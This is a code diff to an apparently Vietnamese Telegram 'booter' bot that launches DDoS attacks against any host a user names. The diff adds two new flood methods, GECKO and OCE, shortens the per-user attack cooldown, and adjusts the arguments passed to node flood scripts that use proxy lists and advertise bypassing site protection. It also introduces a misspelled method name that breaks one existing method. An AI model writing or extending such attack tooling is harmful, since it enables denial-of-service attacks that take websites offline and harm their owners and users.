@@ -157,6 +157,8 @@ CHỈ TAY LÊN TRỜI HẬN ĐỜI VÔ ĐỐI
 │MIX bypass high rqs
 │HTTPS https ddos:)
 │DESTROY high rqs not destroy site:)
+│GECKO bypass medium rqs
+│OCE ok method;)
 
 │ Methods List Layer 4 (update)
 │ Auto update proxy (soon)
@@ -201,8 +203,8 @@ def attack_command(message):
     username = message.from_user.username
 
     current_time = time.time()
-    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
-        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
+    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 100:
+        remaining_time = int(100 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username} Vui Lòng Đợi {remaining_time} Giây Trước Khi Sử Dụng Lại Lệnh.")
         return
     
@@ -211,19 +213,19 @@ def attack_command(message):
     host = args[2]
 
     blocked_domains = ["chinhphu.vn"]   
-    if method == 'TLS' or method == 'RAPID' or method == 'RAW'or method == 'BYPASS' or method == 'HYDRA' or method == 'MIX' or method == 'DESTROY' or method == 'HTTPS':
+    if method == 'TLS' or method == 'RAPID' or method == 'RAW'or method == 'BYPASS' or method == 'HYDRA' or method == 'MIX' or method == 'DESTROY' or method == 'HTTPS' or method == 'GECKO' or method == 'OCE':
         for blocked_domain in blocked_domains:
             if blocked_domain in host:
                 bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                 return
 
-    if method in ['TLS', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESTROY']:
+    if method in ['TLS', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESROY','GECKO','OCE']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
             command = ["node", "tls.js", host, "90", "64", "7", "live.txt"]
             duration = 90
         if method == 'HYDRA':
-            command = ["node", "tls-3.js", host, "90", "64", "7", "live.txt"]
+            command = ["node", "TLS-3.js", host, "90", "64", "7", "live.txt"]
             duration = 90
         if method == 'BYPASS':
             command = ["node", "bypass.js", host, "90", "64", "7", "live.txt"]
@@ -238,10 +240,16 @@ def attack_command(message):
             command = ["node", "mix.js", host, "90", "64", "7", "live.txt"]
             duration = 90
         if method == 'HTTPS':
-            command = ["node", "https.js", host, "90", "64", "live.txt", "64"]
+            command = ["node", "https.js", host, "90", "7", "live.txt", "64"]
             duration = 90
         if method == 'DESTROY':
-            command = ["node", "destroy.js", host, "90", "64", "10", "live.txt"]
+            command = ["node", "destroy.js", host, "90", "64", "7", "live.txt"]
+            duration = 90
+        if method == 'GECKO':
+            command = ["node", "gecko.js", host, "90", "64", "7", "live.txt"]
+            duration = 90
+        if method == 'OCE':
+            command = ["node", "oce.js", host, "90", "64", "7", "live.txt"]
             duration = 90
         cooldown_dict[username] = {'attack': current_time}
 
